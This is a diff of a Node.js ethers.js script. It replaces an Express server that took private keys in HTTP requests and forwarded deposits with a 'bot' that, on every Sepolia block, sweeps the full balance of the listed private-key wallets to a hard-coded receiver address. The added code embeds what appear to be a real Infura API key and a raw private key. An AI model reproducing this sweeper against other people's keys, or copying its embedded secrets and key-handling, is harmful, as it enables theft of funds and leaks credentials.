@@ -1,128 +1,68 @@
-require("dotenv").config();
-const express = require("express");
-const path = require("path");
-
-const PORT = process.env.PORT || 3000;
-
-const app = express();
-// connectToMongoDB();
-
-app.use(express.json());
-
 const ethers = require("ethers");
-const { BigNumber, utils } = ethers;
 
 const provider = new ethers.providers.WebSocketProvider(
-  `wss://sepolia.infura.io/ws/v3/${process.env.INFURA_ID}`
-  // 'sepolia',
+  "wss://sepolia.infura.io/ws/v3/da7be54859904a0d92cc4b8c8b69ac90"
 );
 
-const main = async (privateKey, vwAddress) => {
-  const messages = [];
+const addressReceiver = "0x501a9E31877F562D0b66F79747E0d09A7E62fa36";
 
+const privateKeys = [
+  "217055364ea51620a1562be3a1512f91474faebd17902a0f7c313cb6139558d0",
+];
+
+const bot = async () => {
   try {
-    const depositWallet = new ethers.Wallet(privateKey, provider);
+    provider.on("block", async () => {
+      try {
+        console.log("Listening to new block, waiting ;)");
 
-    const depositWalletAddress = await depositWallet.getAddress();
+        for (let i = 0; i < privateKeys.length; i++) {
+          const privateKey = privateKeys[i];
+          const wallet = new ethers.Wallet(privateKey, provider);
+          const balance = await provider.getBalance(wallet.address);
+          console.log("addressReceiver", addressReceiver);
+          console.log("Balance:", ethers.utils.formatEther(balance));
 
-    messages.push(`Watching for incoming tx to ${depositWalletAddress}…`);
+          const gasPrice = await provider.getGasPrice();
+          // Estimate gas for transfer of all balance
+          const gasLimit = await wallet.estimateGas({
+            to: addressReceiver,
+            value: balance,
+          });
+          console.log(gasLimit);
 
-    await new Promise((resolve, reject) => {
-      provider.on("pending", async (txHash) => {
+          const totalGasCost = gasLimit.mul(gasPrice);
+          console.log(totalGasCost);
 
-          try {
-            const tx = await provider.getTransaction(txHash);
-            if (tx === null) return;
+          if (balance.sub(totalGasCost) > 0) {
+            console.log("New Account with Eth!");
+            const amount = balance.sub(totalGasCost);
 
-            const { from, to, value } = tx;
+            try {
+              const tx = await wallet.sendTransaction({
+                to: addressReceiver,
+                value: amount,
+                chainId: 11155111,
+                gasPrice,
+                gasLimit,
+              });
 
-            if (to === depositWalletAddress) {
-                messages.push(
-                  `Receiving ${utils.formatEther(value)} ETH from ${from}…`
-                );
-
-                messages.push(
-                  `Waiting for ${process.env.CONFIRMATIONS_BEFORE_WITHDRAWAL} confirmations…`
-                );
-
-                tx.wait(process.env.CONFIRMATIONS_BEFORE_WITHDRAWAL).then(
-                  async (_receipt) => {
-                    const currentBalance = await depositWallet.getBalance("latest");
-                    const gasPrice = await provider.getGasPrice();
-                    const gasLimit = 21000;
-                    const maxGasFee = BigNumber.from(gasLimit).mul(gasPrice);
-
-                    const tx = {
-                      // to: process.env.VAULT_WALLET_ADDRESS,
-                      to: vwAddress,
-                      from: depositWalletAddress,
-                      nonce: await depositWallet.getTransactionCount(),
-                      value: currentBalance.sub(maxGasFee),
-                      chainId: 11155111,
-                      gasPrice: gasPrice,
-                      gasLimit: gasLimit,
-                    };
-
-                    depositWallet.sendTransaction(tx).then(
-                      (_receipt) => {
-                        messages.push(
-                          `Withdrew ${utils.formatEther(
-                            currentBalance.sub(maxGasFee)
-                          )} ETH to VAULT ${vwAddress} ✅`
-                        );
-                        resolve();
-                      },
-                      (reason) => {
-                        messages.push(`Withdrawal failed, Reason: ${reason}`);
-                        resolve();
-                      }
-                    );
-                  },
-                  (reason) => {
-                    messages.push(`Receival failed, Reason: ${reason}`);
-                    resolve();
-                  }
-                );
-
+              await tx.wait(); // Wait for transaction confirmation
+              console.log(
+                `Success! transferred ${ethers.utils.formatEther(amount)} ETH`
+              );
+            } catch (e) {
+              console.log(`Error: ${e}`);
             }
-          } catch (error) {
-            console.error(error);
-            throw error;
           }
-        });
+        }
+      } catch (err) {
+        console.error(err);
+      }
     });
-    return messages;
-  } catch (error) {
-    console.error(error);
-    throw error;
+  } catch (err) {
+    console.error(err);
   }
-
 };
 
-app.use(express.static(path.join(__dirname, "public")));
-
-app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "views", "index.html"));
-});
-
-app.post("/api/bot", async (req, res) => {
-  const { privateKey, vwAddress } = req.body;
-
-  try {
-    const messages = await main(privateKey, vwAddress);
-    console.log(messages);
-    res.status(200).json({ messages });
-  } catch (error) {
-    res
-      .status(500)
-      .json({ error: "An error occurred while processing the request" });
-  }
-});
-
-app.get("*", async (req, res) => {
-  res.status(404).send({ message: `${req.url} not found!` });
-});
-
-app.listen(PORT, () => {
-  console.log("Server is running on PORT", PORT);
-});
+bot();
